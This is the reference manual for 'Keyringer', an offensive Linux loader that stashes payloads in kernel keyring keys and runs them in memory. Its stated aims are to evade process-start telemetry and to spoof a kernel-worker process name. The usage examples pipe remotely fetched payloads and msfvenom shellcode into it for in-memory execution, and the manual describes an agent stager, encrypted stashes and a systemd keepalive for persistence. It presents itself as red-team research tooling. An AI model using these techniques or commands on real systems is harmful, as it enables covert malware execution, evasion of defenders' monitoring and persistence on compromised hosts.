# Keyringer CLI and technical reference

Technical reference for Keyringer's Linux x86-64/AArch64 kernel-keyring
loader, command-line interface, wire formats, tests, and detections. The
implementation stores ELF images or raw code in chunked `user` (or
`big_key`) keys via `add_key(2)`, reads them with `keyctl(KEYCTL_READ)`,
revokes keys as they are consumed, then maps and enters the payload
in-process. Its execution path does not use `execve`, `execveat`,
`memfd_create`, or `fork`; therefore process-start telemetry and ordinary
payload file-descriptor inspection alone may miss it. Keyring syscalls,
executable mappings, and process metadata remain observable; see
[Detection and forensics](#detection-and-forensics) for detection guidance.

Wire protocol v4 by default (`kr_version()` reports `keyringer core 4.0`):
per-chunk AEAD bodies and streaming exec, with `KR_WIRE=3`/`KR_WIRE=2` as
opt-in downgrades — see [Wire protocol](#wire-protocol). Newer additions:
zero-disk
`--selfcontained` dynamic payloads, `--type big_key`
chunking, `--share`/`--from` serial handoff, `--keyfd` key ingestion, the
KAG1-framed `agent` stager, `--clone` child execution, `keygen`,
`keepalive`, `preflight`, khttp `--proxy`/`--header`/`--insecure`, and an
AArch64 build lane.

## Credits

Reproduces the publicly documented kernel-keyring fileless exec technique:

- Write-up: [Linux kernel keyring fileless exec](https://matheuzsecurity.github.io/hacking/linux-kernel-keyring-fileless-exec/) by MatheuZSecurity
- Reference open-source implementation: [MatheuZSecurity/Dntry](https://github.com/MatheuZSecurity/Dntry)

Extensions over Dntry: multi-key chunking (`<prefix>.NNN`, 30000 B per key),
a precisely specified wire protocol shared with a Python twin (v2.2: a
SHA-256 integrity digest on every stash), an optional ChaCha20-Poly1305
stash envelope, `--raw` shellcode mode, an in-memory `--call` relocator,
persistent-keyring stashes, HTTP payload delivery, default-on execution
hardening, zero-disk interpreter stashing (`--selfcontained`), `big_key`
chunking, cross-UID stash handoff (`--share`/`--from`), a framed-pipe
`agent`, `keepalive`/`preflight`/`keygen` utilities, an AArch64 build lane,
and shipped detections (`detections/`).

## Authorized use only

This is a research and red-team tool for lab environments and authorized
engagements. It reproduces published research for educational purposes. You are
responsible for compliance with all applicable laws and for obtaining proper
authorization before use.

## Architecture

Five artifacts implement one wire protocol:

| Artifact | What it is |
|----------|------------|
| `keyringer` | CLI, musl-gcc `-static` (fallback `cc -static`). Cannot `dlopen`, so `khttp` prints a clean error — use `keyringer-dyn` or pipe through `kstdin`. |
| `keyringer-dyn` | Same sources, glibc-dynamic (`-ldl`). Exists because musl-static binaries cannot `dlopen` at all; required for `khttp`. |
| `keyringer.aarch64` | Same sources, `aarch64-linux-gnu-gcc -static -DKR_NO_DLOPEN` (`make ARCH=aarch64`). Native-payload lane: validates `EM_AARCH64` payloads, rejects `EM_X86_64`. |
| `libkeyringer.so` / `libkeyringer.a` + `keyringer.h` | Library mode (`kr_stash`, `kr_load_revoke`, `kr_exec_image`, `kr_call_symbol`, `kr_selftest`, v2.2: `kr_keygen`, `kr_keepalive_beat`, `kr_vma_probe`, `kr_alg_probe`, `kr_clone_smoke`, `kr_http_get_ex`). Never calls `exit()`/`abort()` and never writes to stdio: failures return `-1` with a diagnostic in the caller's `err[KR_ERRSZ]` buffer; progress goes through the optional `kr_set_log()` hook. |
| `keyringer.py` | Single-file stdlib-only ctypes twin. Wire-compatible with the C tool in both directions. |

Loader pipeline (identical logic in C and Python):

1. **Stash** — the payload is first wrapped in the v2.2 wire: a 40-byte
   `KRH1` digest header plus, with a key, a `KR1` ChaCha20-Poly1305
   envelope. The wrapped wire is split into at-most-30000-byte chunks (or
   100000-byte chunks with `--type big_key`) and each is `add_key(2)`ed as a
   `user`/`big_key` key named `<prefix>.NNN` onto the session keyring (or the
   per-UID persistent ring with `--persistent`). With `--selfcontained` the
   ELF's `PT_INTERP` interpreter is stashed the same way under
   `<prefix>.ldso.NNN` after the payload chunks. On failure the
   already-stored chunks are revoked.
2. **Load** — `request_key(2)` resolves chunk `000` on the session ring; if it
   is not there, the whole sequence is retried on the persistent ring
   (`KEYCTL_GET_PERSISTENT` + `KEYCTL_SEARCH`). The ring that serves chunk
   `000` serves the entire sequence — never a mix. Alternatively `--from
   S1,S2,...` reads chunk i directly from the i-th listed serial. Each chunk
   is `keyctl(READ)`-ed (size probe, then read) and revoked as soon as its
   read completes (best-effort under `--from` — foreign keys may refuse);
   the first `ENOKEY` gap terminates the sequence. The jump can only happen
   after every key is spent.
3. **Exec** — the ELF is validated (ELFCLASS64, little-endian, `EM_X86_64`
   or `EM_AARCH64` per build, `ET_EXEC`/`ET_DYN` only; 32-bit and
   cross-arch are rejected), its `PT_LOAD` segments are mapped `RW` with
   `MAP_FIXED_NOREPLACE` (fixed vaddrs for `ET_EXEC`, a probed base for
   `ET_DYN`) and then `mprotect`ed to their `p_flags` protection — a `W+X`
   segment stays RWX; this is a research tool. A `PT_INTERP` interpreter is
   normally loaded from disk by design — same as the kernel does; only the
   payload itself is fileless. With `--selfcontained` the interpreter is
   instead reassembled from the `.ldso.` keys and mapped from memory, so a
   dynamic payload run touches disk zero times (see below). The loader
   builds a fresh 8 MiB SysV process-start stack (argc/argv/envp/auxv
   including `AT_RANDOM`, `AT_PHDR`, `AT_EXECFN`, `AT_SYSINFO_EHDR`), spoofs
   the process name, switches `rsp` and jumps to the entry with `rdx = 0`
   (rtld_fini). All loader diagnostics go to stderr; the payload inherits
   clean stdout/stderr. Execution hardening (see below) runs before any
   payload byte is staged.

## Build

```sh
make                # keyringer          (x86_64)
make lib            # libkeyringer.so + libkeyringer.a
make libtest        # build + run test/libuser, a -lkeyringer consumer
make test           # full 38-section x86 test suite (also builds keyringer-dyn and payloads)
make ARCH=aarch64   # keyringer.aarch64  (aarch64-linux-gnu-gcc -static -DKR_NO_DLOPEN)
make ARCH=aarch64 test   # emulated aarch64 suite under qemu-aarch64
make verify-aarch64 # real-kernel arm64 battery in qemu-system (see AArch64 lane)
make hunt-test      # purple harness: fire a stash, assert the detectors catch it
make clean
```

Test payloads built by `make test`:

- `test/hello` — freestanding `-nostdlib -static` ET_EXEC at `0x40000000`;
  prints `keyringer ok` via raw syscalls.
- `test/hello_a64` — the same idea for `EM_AARCH64` (arm64 `ret` encoding
  and syscalls); the native payload of the `keyringer.aarch64` build, run
  under `qemu-aarch64`.
- `test/lib.so` — `-nostdlib -shared -fPIC` shared object exporting
  `kratest(argc, argv, envp)`, which prints `call ok <argv[1]>` and returns 42.
- `test/shellcode.bin` — raw position-independent machine code
  (`objcopy -O binary -j .text`) that does `write(1, "raw ok\n", 7); exit(0)`.
- `test/shellcode7.bin` — variant exiting with status 7 (exercises `--clone`
  exit-status propagation).

## Usage

### CLI (C)

```
keyringer stash <file|->               store payload in kernel keyring (chunked); prints serials
keyringer kfile <elf> [name] [args...] stash from file, then revoke+load+execute
keyringer kstdin [name] [args...]      stash from stdin, then revoke+load+execute
keyringer khttp <url> [name] [args...] fetch over HTTP(S) (libcurl dlopen'd at runtime),
                                       then stash, revoke+load+execute
keyringer exec [name] [args...]        load previously-stashed keys, revoke, execute
keyringer agent [--ctlfd N] [...]      KAG1-frame control loop: stash+clone-exec per frame
keyringer keygen                       print a fresh 64-hex-char key to stdout
keyringer keepalive [opts]             refresh the persistent keyring expiry in a loop
keyringer preflight                    environment checks (W^X, seccomp, LSMs, keyring, ...)
keyringer list [--desc P] [--json]     list <P>.* keys visible to this user (parse /proc/keys)
keyringer gc [--desc P]                DESTROY every visible <P>.* key (stashes, stale chunks,
                                       revoked ghosts of your rings) via KEYCTL_INVALIDATE
keyringer selftest                     crypto + integrity self-test (RFC 8439 AEAD vector,
                                       SHA-256 KAT, wire-v2 stash roundtrip + tamper check)
keyringer help
```

Flags may appear anywhere after the subcommand:

- `--desc PREFIX` — key name prefix (default `_keyringer`, env `KEYRINGER_DESC`)
- `--key HEX` — 64 hex chars; seal the stash with ChaCha20-Poly1305
  (env `KEYRINGER_KEY`); exec needs the same key
- `--keyfd N` — read the key from inherited fd N until EOF: raw 32 bytes or
  64 hex chars. Precedence `--key` > `--keyfd` > env. `--key`/env leak via
  `ps` and `/proc/<pid>/environ`; `--keyfd` does not
- `--persistent` — stash into the per-UID persistent keyring
- `--raw` — payload is raw shellcode, not an ELF
- `--call SYM` — relocate a self-contained shared object and call `SYM` instead
  of jumping the ELF entry (`--raw`/`--call`/`--clone` are mutually exclusive)
- `--selfcontained` — stash the payload ELF's `PT_INTERP` interpreter
  alongside the payload (`<prefix>.ldso.NNN`, always plaintext); exec
  reassembles and maps it from those keys instead of reading it from disk
- `--type big_key` — stash with `big_key` keys and 100000-byte wire chunks
  (default `user`/30000); exec lookups try `user` first, then `big_key`,
  per chunk index
- `--from S1,S2,...` — exec: read chunk i directly from the i-th serial
  (`KEYCTL_READ`, no `request_key`); revoke is best-effort
- `--share` — after stash, `KEYCTL_SETPERM(0x3f3f0000)` every stored key and
  print `share: <s1>,<s2>,...` on stdout (parseable by `--from`)
- `--ttl SECONDS` — stash: `KEYCTL_SET_TIMEOUT` every stored key so the
  kernel garbage-collects the stash even if the stasher dies first
  (crash-safe expiry; the payload outlives nothing)
- `--scrub` — exec-family: destroy each chunk with `KEYCTL_INVALIDATE`
  right after its read instead of revoking it. Dead immediately and swept
  at the next keyring GC (`kernel.keys.gc_delay`, 300s default) — versus
  the revoke path, whose `R`-flag ghosts linger until their ring dies.
  Nothing scrubbed is replayable. The invalidate must happen while the
  key is still possessed (it is — `request_key` links it on lookup);
  after an unlink it would be EACCES
- `--json` — machine-readable output for `list` (array of
  `{serial, type, desc, revoked}`) and `preflight` (array of
  `{name, status, critical, detail}`)
- `--keep-ring` — kfile/kstdin opt-out: these one-shot runs join a fresh
  session keyring by default, so every stash key they touch — even the
  revoked ghosts — dies with the process instead of lingering on your
  shell's ring for its lifetime. `--share`/`--from` disable the fresh ring
  automatically (serial handoff needs keys that outlive the process)
- `--clone` — stage the image, then `clone()` a child that runs the payload
  on a fresh stack; parent `waitpid()`s and exits with the payload's status
- `--ctlfd N` — agent: read KAG1 control frames from fd N (default 0)
- `--proxy URL` / `--header STR` (repeatable) / `--insecure` — khttp extras
  through the runtime-dlopened libcurl (`CURLOPT_PROXY`, `curl_slist` +
  `CURLOPT_HTTPHEADER`, `CURLOPT_SSL_VERIFYPEER`/`HOST 0`)

`[name]` is the spoofed process name, default `kworker/u8:2`: set with
`prctl(PR_SET_NAME)` and written into the wiped argv area (`argv[0]` of the
payload), so `/proc/<pid>/cmdline` and `comm` show it. Any `[args...]` become
the payload's `argv[1..]`.

### Examples

```sh
# stash-and-run from a file, spoofing as "myworker"
./keyringer kfile payload.elf myworker --serve --port 8443

# stash now, execute later from another shell
./keyringer stash - < payload.elf
./keyringer exec myworker

# stdin / HTTP delivery, nothing on disk but the loader
curl -s https://example.test/payload | ./keyringer kstdin
./keyringer-dyn khttp https://example.test/payload myworker   # dynamic build

# encrypted stash without leaking the key on the command line
./keyringer keygen > /dev/null                  # 64 hex chars on stdout
KEY=00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff
curl -s https://example.test/payload | ./keyringer kstdin --key $KEY
exec 3< <(printf %s "$KEY")                     # or: --keyfd 3 (raw 32 B or 64 hex)
./keyringer exec --keyfd 3

# zero-disk dynamic payload: interpreter comes from the keyring too
sudo ./keyringer kfile --selfcontained /bin/true myworker

# capacity: big_key chunks (100000 B; auto-selected when maxkeys binds —
# on this kernel a big_key charges desc+21 B of byte quota, not its payload)
./keyringer kfile --type big_key big.elf

# hand a stash to another process/UID: share, then load by serial list
serials=$(./keyringer stash --share - < payload.elf | sed -n 's/^share: //p')
./keyringer exec --from "$serials" myworker

# KAG1 agent: many payloads under one PID, fed on a pipe
{ len+payload+name frames; zero-length frame; } | ./keyringer agent

# keep the persistent ring alive; --unit prints a systemd user unit pair
./keyringer keepalive --interval 3600 --times 24
./keyringer keepalive --unit

# environment triage before an engagement
./keyringer preflight

# msfvenom-style shellcode
msfvenom -p linux/x64/exec CMD=/bin/sh -f raw | ./keyringer kstdin --raw

# call one exported function of a self-contained shared object
cc -nostdlib -shared -fPIC -o lib.so lib.c
./keyringer kfile --call kratest lib.so myworker testarg   # exit code 42

# inventory / hunt
./keyringer list
./keyringer list --desc mytest.abc
```

`khttp` fetches via `dlopen("libcurl.so.4")` at runtime — no link-time
libcurl dependency. TLS peer verification stays at libcurl's defaults
(enabled); `--insecure` disables it, `--proxy URL` sets `CURLOPT_PROXY`,
and each `--header STR` (repeatable) is appended via `curl_slist`. On the
static build it fails with a clean error pointing at
`curl -s <url> | keyringer kstdin`.

### Library (libkeyringer)

```c
#include "keyringer.h"

char err[KR_ERRSZ];
kr_opts o = {0};
/* o.desc_prefix, o.key_hex, o.persistent, o.raw, o.call_symbol          */
/* v2.2: o.selfcontained, o.key_type ("big_key"), o.from_serials,        */
/* o.share, o.clone_child, o.serials_out*, o.child_pid_out               */
/* all default to the CLI behavior: NULL/"_keyringer", NULL/plaintext    */

kr_set_log(my_stderr_logger);      /* optional progress hook, default silent */
kr_set_process_argv(argc, argv);   /* enables the argv-area wipe on exec     */

if (kr_stash(buf, len, &o, err) != 0)          die(err);
void *img; size_t ilen;
if (kr_load_revoke(&o, &img, &ilen, err) != 0) die(err);   /* free(img)   */
kr_exec_image(img, ilen, &o, argc, argv, environ, err);    /* no return   */
/* with o.clone_child set, kr_exec_image RETURNS the payload's exit      */
/* status (or 128+signal) instead                                        */
/* or: long rv; kr_call_symbol(img, ilen, &o, argc, argv, environ, &rv, err); */
```

API: `kr_stash`, `kr_load_revoke` (returns a malloc'd image), `kr_exec_image`
(never returns on success unless `clone_child`), `kr_call_symbol` (returns
with the symbol's return value), `kr_selftest`, `kr_version`, `kr_http_get`
/ `kr_http_get_ex` (runtime-dlopened libcurl, proxy/headers/insecure), and
the v2.2 additions `kr_keygen` (32 B hex), `kr_keepalive_beat` (returns the
chunk-000 serial, 0 if absent, -1+err if the ring is unavailable),
`kr_vma_probe`, `kr_alg_probe`, `kr_clone_smoke`.
Library paths never call `exit()`/`abort()` and never touch stdio; link
against `-lkeyringer` and see `test/libuser.c` (`make libtest`).

### Python twin (keyringer.py)

```sh
python3 keyringer.py stash - < payload.elf
python3 keyringer.py kfile payload.elf myworker
python3 keyringer.py exec --key $KEY
python3 keyringer.py selftest
```

Same subcommands and flags as the C CLI except `khttp`; stdlib only (ctypes,
os, sys, socket, struct, secrets, errno, hmac, hashlib, time; io/contextlib
inside the selftest), no third-party imports, no subprocess. Wire-compatible
in both directions: either tool can stash what the other executes.

Mirrored v2.2 features: `--selfcontained` (both stash and exec sides),
`--type big_key`, `--share`/`--from`, `--keyfd`, `keygen`, `preflight` (a
light mirror of the C report), and `PR_SET_VMA` labeling parity.
C-only — implemented in the C tool only, the twin refuses them cleanly with
a one-line pointer to the C tool: `agent`, `keepalive`, `--clone`, `khttp`
and its `--proxy`/`--header`/`--insecure` options, and the `ARCH=aarch64`
build. The twin is x86_64-only and refuses to start on any other machine
(arm64 is the C tool's lane).
Differences worth knowing:

- Crypto uses the kernel AF_ALG transform when it reproduces the RFC 8439
  §2.8.2 vector; otherwise a pure-Python RFC 8439 implementation is used —
  byte-identical output (the choice is made once at startup by encrypting the
  RFC vector both ways).
- The original argv memory is not wiped (CPython owns those strings); only
  `prctl(PR_SET_NAME)` spoofing is applied.
- `--call` additionally accepts `R_X86_64_JUMP_SLOT` relocations; the C loader
  accepts only `RELATIVE`/`64`/`GLOB_DAT`.

## Zero-disk dynamic payloads (`--selfcontained`)

A dynamically linked payload ELF carries a `PT_INTERP` entry pointing at
ld.so. Without this flag the loader opens that path from disk by design —
same as the kernel does; only the payload itself is fileless. With
`--selfcontained` the interpreter joins the payload in kernel memory:

- **Stash side**: after the payload chunks are stored, the validated ELF's
  `PT_INTERP` path is parsed and the interpreter file is read and chunked
  under `<prefix>.ldso.NNN` (same `%03d` numbering, stored after the payload
  chunks). The interpreter wire is a `KRH1` header with `flags=0` followed
  by the raw interpreter bytes — **always plaintext, regardless of `--key`**:
  ld.so is a public artifact, sealing it has no signature value, but the
  digest is still verified on load.
- **Exec side**: the `.ldso.` sequence is reassembled with the same ring
  fallback and ENOKEY-terminates loop as payloads, its `KRH1` digest is
  verified, and the interpreter is mapped from those bytes (at
  `main base + span + 16 MB`, with `AT_BASE` pointing at it) instead of
  opening the disk path. A dynamic payload run therefore touches disk zero
  times. Without the flag, the disk interpreter path is used exactly as
  before; a `--selfcontained` exec against a stash without `.ldso.` keys is
  a clean error naming the missing interpreter sequence.

Verified as root (the non-root quota cannot hold a dynamic stash): stashing
and running `/bin/true` stores 2 payload chunks (43472 wire bytes) plus its
~225 KB interpreter (`/lib64/ld-linux-x86-64.so.2`, 225672 B) across 8
`.ldso.` chunks; the exec jump happens via the memory-mapped interpreter
with the digest verified, and `/bin/true` runs with zero disk touches.

## Modes

### `--raw` — raw shellcode

Skips all ELF validation and mapping: one RWX `mmap`, payload copied in, jump
to the region start with the same fresh SysV stack and spoofing. For
msfvenom-style position-independent blobs.

### `--call SYM` — in-memory relocation and call

Instead of jumping the ELF entry, the loader maps the image, applies
relocations in place, and calls `int sym(int argc, char **argv, char **envp)`
on the normal stack, exiting with its return value. Only `R_X86_64_RELATIVE`,
`R_X86_64_64`, and `R_X86_64_GLOB_DAT` against locally defined symbols are
applied; any other relocation type or an undefined symbol is a clean error —
ld.so-style dynamic linking is deliberately not attempted. Build the object
with `-nostdlib -shared -fPIC`, no undefined symbols, unstripped (the
relocator needs `SHT_SYMTAB`). x86-64 builds only. See `test/lib.c`.

### `--persistent` — persistent keyring

`stash --persistent` resolves the per-UID `persistent.<uid>` ring with
`KEYCTL_GET_PERSISTENT` and `add_key(2)`s the chunks into that serial. The
ring survives logout but dies at reboot, and expires after
`/proc/sys/kernel/keys/persistent_keyring_expiry` (259200 s on this box)
without access; every `GET_PERSISTENT` refreshes the clock (the `keepalive`
subcommand automates exactly that refresh — see below).

Kernel quirk on this box (documented and handled, mirrored in `keyringer.py`):
this kernel's uapi defines `KEYCTL_GET_PERSISTENT` as `22` (not the historical
17/16), and dest serial `0` fails with `EINVAL`. The code retries with
`KEY_SPEC_USER_KEYRING` (`@u`) as dest, which returns the `persistent.<uid>`
serial (and links the ring under `@u` — what `keyctl show @u` displays).

### Key handling: `--key HEX`, `--keyfd N`, `keygen`

Keys are 32 bytes, presented as 64 hex chars. Sources and precedence:
`--key HEX` > `--keyfd N` > env `KEYRINGER_KEY`. `--keyfd` reads an
inherited fd until EOF and accepts raw 32 bytes or 64 hex chars — it closes
the `ps`/`/proc/<pid>/environ` leak that `--key` and the env var expose,
since a key passed that way is visible to every other local process as the
same user. `keygen` prints a fresh key (32 bytes from
`getrandom(2)`/urandom) as 64 lowercase hex chars on stdout, ready to feed
into a `--keyfd` pipe or a secrets manager. See the wire-protocol section
for the envelope format and the stash-time seal roundtrip check.

### `--type big_key` — 100000-byte chunks

Stashes with key type `big_key` instead of `user`, raising the wire chunk
size from 30000 to 100000 bytes (the `user` type hard-caps a single payload
at 32767 B; `big_key` does not have that cap). On exec, the per-index chunk
lookup tries `user` first and then `big_key`, so mixed-type stashes are
tolerated and the flag is not needed at exec time. Honest caveats:
`big_key` payloads may spill to swap-backed shmem on this and other kernels
(a capacity-over-guarantee tradeoff — `user` payloads stay in
slab-allocated key data), and the byte-quota story is kernel-specific:
on this kernel a `big_key` charges a FIXED `strlen(desc) + 21` bytes —
the payload is NOT byte-charged (measured: a 100000-byte chunk charged
27 B as non-root; `/proc/keys` shows it as `[file]`), so `big_key`'s
real levers are (1) fewer, larger keys — the `maxkeys` relief, which the
upfront planner AUTO-SELECTS for a default stash when the `user` chunk
count would exceed `maxkeys` (log: `stash: auto big_key (chunk count
would exceed maxkeys)`) — and (2) payloads above the 30000-byte `user`
chunk size. Do not bank on byte relief across kernels: the planner
measures the live quota but charges `user` arithmetic conservatively, and
the byte-quota multiplier for both types remains root (25 MiB) or pooling
across UIDs with `--share`/`--from` — the quota always charges the
owning UID.

### `--share` / `--from` — stash handoff across processes and UIDs

`stash --share` runs `KEYCTL_SETPERM(0x3f3f0000)` — possessor+user: all,
the same value keyrings use by default, as seen in `/proc/keys` — on every
stored serial (payload and interpreter chunks) and prints
`share: <s1>,<s2>,...` on stdout. `exec --from S1,S2,...` consumes that
list: chunk i is read directly from the i-th serial via the usual
`KEYCTL_READ` size probe + read, with no `request_key` and no prefix
lookup; revocation is best-effort (EPERM/EACCES on a foreign key is
nonfatal). The usual `KRH1` digest verification applies.

Honest boundary: sharing only grants *permission* — the quota always charges
the owning UID, so pooling stashes across UIDs requires each owning UID's
active cooperation, and the non-root ceiling still caps what any single UID
can contribute.

### `--clone` — one-shot child exec

`--clone` (kfile/kstdin/khttp/exec) stages the image as usual (dumpable 0,
DONTDUMP, VMA naming, digest, revoke) and then `clone()`s — with
`CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|SIGCHLD` — a child that runs
the payload on a fresh per-child mmap'd stack. The parent `waitpid()`s and
exits with the payload's exit status (128+signal convention). No
`execve` is ever issued: process-start telemetry never fires, and the
child's `exit_group` is the only terminal event. `clone()` is the one
concurrency primitive explicitly allowed by this codebase's syscall policy;
`execve`/`execveat`/`memfd_create`/`fork` remain banned everywhere.

## Stash lifecycle: `--ttl`, `--scrub`, `gc`

Three ways to control what a stash leaves behind:

- **`--ttl SECONDS`** (stash-side) — every stored key gets a kernel expiry
  (`KEYCTL_SET_TIMEOUT`). A stash whose loader dies before consuming it
  disappears on its own instead of sitting in the keyring until manually
  found. Combine freely with `--persistent` (whose *ring* expiry keepalive
  refreshes — chunk TTLs still apply per key).
- **`--scrub`** (exec-side) — consume-and-destroy: each chunk is
  invalidated the moment its read completes. Where the default revoke path
  leaves an `R`-flag ghost in `/proc/keys` that lives as long as its ring,
  a scrubbed key is dead instantly and vanishes at the next keyring GC.
  Behavior is identical across the C tool and the Python twin, and
  cross-implementation (C stash → twin `exec --scrub`, twin stash → C
  `exec --scrub`).
- **`gc`** — sweep command: invalidate every visible `<prefix>.*` key
  (`user` and `big_key`, from the `/proc/keys` inventory). Non-root, it
  destroys keys in rings you possess (your live and stale stashes); root
  additionally sweeps anything left on the box. Kernel caveat the suite
  documents: an *already-revoked* ghost cannot be invalidated by anyone —
  even root gets EKEYREVOKED — it dies only when its owning ring does.
  One more reason `--scrub` exists: scrubbed keys never become ghosts.

`list --json` and `preflight --json` give machine-readable inventory and
environment triage for exactly this lifecycle work.

## `agent` — framed-pipe stager

`keyringer agent` turns the loader into a long-lived in-process service: it
reads length-prefixed control frames from a file descriptor (default stdin;
`--ctlfd N` selects another inherited fd) and runs one stash + clone-exec
per frame — many payloads under one PID, still zero `execve`.

Frame format (all little-endian):

```
u32 LE  magic 0x3147414B        ("KAG1")
u32 LE  len
u8[len] payload bytes           (a complete wire-v2.2 stash image)
u16 LE  name_len
u8[name_len] name               (spoofed process name for this frame)
```

`len == 0` is the terminator: the agent exits cleanly. Each frame is
stashed and executed in a `clone()` child (`CLONE_VM|CLONE_FS|CLONE_FILES|
CLONE_SIGHAND|SIGCHLD`) exactly like `--clone`, so the agent process
survives payloads and keeps serving frames from the same PID. Per frame it
prints `agent: ran <name> pid=<pid> exit=<code>`; on control-stream end it
reports `agent: N frame(s) executed` and exits 0 (load/exec failures report
exit 125 for that frame and continue).

Payloads inherit the agent's fds, so a framework wanting clean payload
stdin should pass a dedicated ctl fd via `--ctlfd N` and leave real stdin
for the payloads.

Hardening interplay, stated plainly: `MADV_WIPEONFORK` does not fire on
`CLONE_VM` — shared mappings are not copied, so there is no child copy to
wipe — which is fine here because the payload stack is a fresh per-child
`mmap` anyway, and the staged image is `PR_SET_DUMPABLE 0` + `DONTDUMP` in
the shared address space either way.

## `keepalive` — persistent-ring expiry refresh

Persistent keyrings expire after
`/proc/sys/kernel/keys/persistent_keyring_expiry` idle (259200 s here); any
`KEYCTL_GET_PERSISTENT` refreshes the clock. `keyringer keepalive` loops
that refresh and checks chunk `000` each beat:

- `keepalive: ring alive, chunk000 serial <N>` — ring refreshed, stash
  still present
- `keepalive: ring alive, chunk000 serial absent` — ring refreshed, stash
  consumed or gone
- errors go to stderr with a nonzero exit

Options: `--desc P` (which stash to check), `--interval S` (default 3600),
`--times N` (default: forever), `--unit` (print a systemd **user**
service+timer pair — `~/.config/systemd/user/keyringer-keepalive.{service,
timer}` — for manual install instead of looping; `ExecStart` is derived
from `/proc/self/exe`, `%h`-ified under `$HOME`).

## `preflight` — environment checks

`keyringer preflight` runs nine checks and prints one line each:

1. **seccomp** (CRITICAL) — `Seccomp`/`Seccomp_filters` from
   `/proc/self/status`: a filter can silently break `keyctl`/`clone`.
2. **SELinux** (INFO) — `/sys/fs/selinux/enforce` presence and mode.
3. **AppArmor** (INFO) — current confinement from
   `/proc/self/attr/current`.
4. **W^X self-test** (CRITICAL) — writes a `ret` (arm64 encoding on AArch64)
   into an anonymous RW page, `mprotect`s it PROT_EXEC, confirms the x bit
   in `/proc/self/maps`, then calls it. A kernel that refuses makes the
   staging flow fail.
5. **keyring limits** — `kernel.keys/maxkeys`/`maxbytes` for this UID.
6. **libcurl dlopen** — whether `libcurl.so.4` can be runtime-loaded
   (decides `khttp` availability on this build).
7. **PR_SET_VMA support** — `kr_vma_probe` names one scratch page and
   checks `/proc/self/maps` for the name (nonfatal where unsupported).
8. **clone smoke** — a `clone(CLONE_VM|SIGCHLD)` child runs and is
   reaped.
9. **AF_ALG binds** — `("hash","sha256")` and
   `("aead","rfc7539(chacha20,poly1305)")` sockets bind.

Exit semantics: 0 unless a **CRITICAL** check (seccomp, W^X) fails, then 1.
A hardened target where preflight exits 1 will also break the loader itself
— treat a failing preflight as a stop condition, not a warning.

## AArch64 lane

`make ARCH=aarch64` builds `keyringer.aarch64` with
`aarch64-linux-gnu-gcc -static` (musl-gcc is x86-only; glibc static is
fine, so the arm64 binary is built `-DKR_NO_DLOPEN` — no `dlopen`, hence no
`khttp`, mirroring the musl-static behavior). `make ARCH=aarch64 test` runs
the emulated suite (`test_a64`) under `qemu-aarch64` with `test/hello_a64`
as the native payload. The build validates `EM_AARCH64` payloads and
rejects `EM_X86_64` ones with the clean arch error; the x86 suite proves
the mirror image (a real `EM_AARCH64` payload rejected by the x86 build,
section 20). Guest syscalls pass through to the real kernel under
qemu-user, so the AF_ALG crypto and SHA-256 paths are exercised for real.

### Real-kernel verification (`make verify-aarch64`)

`qemu-user` cannot pass the keyring syscalls through (see the honest notes),
so the definitive arm64 check is `make verify-aarch64`: it boots a
**qemu-system-aarch64 VM** — Alpine netboot `vmlinuz-virt` (6.12) plus an
initramfs overlay in `test/a64vm/` carrying `keyringer.aarch64`, the
`test/hello_a64` payload, the guest kernel's crypto modules (AF_ALG is
modular on the alpine virt kernel) and a session-keyring joiner (PID 1 has
no session ring, so stash→exec children would otherwise each get their own
transient ring) — and runs the full battery on a real kernel: selftest,
preflight, deferred `stash` → `exec` **across processes**, `kstdin`
(stash+exec in-process), `--key` encrypted roundtrip, wrong-key rejection,
`list`. `big_key` documents a SKIP where the guest kernel lacks
`CONFIG_BIG_KEYS` (covered by the x86 suite). Assets (~345 MB) are fetched
once into `test/a64vm/dl/` and cached. First run of this lane found a real
arm64-only bug: the `jump_to_entry` inline asm zeroed `x0`/`x29`/`x30`
without declaring them clobbered, so the compiler was free to allocate the
entry address into `x30` and the loader branched to address 0 (`IABT` at
`pc=0`) — invisible under qemu-user, which never reaches that code, and
impossible on x86, whose trampoline declares all its clobbers. Fixed by
adding the clobber list; both lanes stay green.

Honest environment notes from this box:

- This box's `qemu-aarch64` 10.0.13 returns `ENOSYS` for
  `add_key`/`request_key`/`keyctl` — no keyring passthrough under TCG — so
  the stash+exec roundtrip (`a3`) and the qemu-side arch-validation check
  (`a2`, where the stash ENOSYS fires before exec-side validation) are
  documented SKIPs. AF_ALG does pass through, so selftest and preflight
  (`a1`/`a1b`) run for real. The stash+exec path for the shared loader
  logic is proven for real by `make verify-aarch64` above.
- `PR_SET_VMA` naming is rejected by this PVE kernel
  (`CONFIG_ANON_VMA_NAME=y` in the config, yet `EINVAL` at runtime). The
  feature is nonfatal — a warning is logged, everything else proceeds —
  and works on stock distro kernels.

### Debian lane (`make verify-aarch64-debian`)

A second real-kernel arm64 lane in `test/a64vm-debian/`, built on the
**Debian stable (trixie) arm64 netboot kernel** instead of Alpine's, with
the same architecture: `linux` + `initrd.gz` from
`dists/stable/main/installer-arm64/current/images/netboot/debian-installer/arm64/`
booted in `qemu-system-aarch64 -M virt`, our cpio overlay appended to the
d-i initrd so our `/init` overrides the installer's, a session-keyring
joiner (PID 1 has no session ring — the same `join.c` twin), and the same
battery. It exists to deliver the two things the Alpine lane cannot:

- **An audit-enabled kernel.** Debian builds `CONFIG_AUDIT=y` and
  `CONFIG_AUDITSYSCALL=y`; the lane boots with `audit=1` and asserts the
  enabled boot record (`audit: initializing netlink subsys (enabled)` plus
  the `type=2000 state=initialized audit_enabled=1` event). Two honest
  observations from this kernel generation (6.12; also true on this box's
  7.x PVE kernel): a default boot initializes audit **disabled**
  (`audit_enabled=0` in the boot record), and
  `/proc/sys/kernel/audit_enabled` is **not registered at all** — the
  audit sysctls are gone from the default table, so dmesg is the state
  channel and `audit=1` (not sysctl writes) is how you boot enabled.
  **Remaining open item:** auditd-userspace live testing (rule loading,
  `ausearch` correlation) needs a full rootfs with the audit package set —
  an initramfs only has the kernel side — and stays out of scope.
- **A `big_key` roundtrip on arm64, tried for real.** It turns out
  Debian's kernel cannot offer it either, and for an interesting reason:
  v6.12 `BIG_KEYS` depends on `CRYPTO_LIB_CHACHA20POLY1305 = y`, but Debian
  builds that library as a **module** (`=m`), so the `CONFIG_BIG_KEYS`
  symbol is not even offered — zero lines in the shipped config and no
  `big_key.ko` anywhere in the `linux-image` deb. The battery still tries
  (modprobe, then `stash --type big_key`), records the `ENODEV` plus the
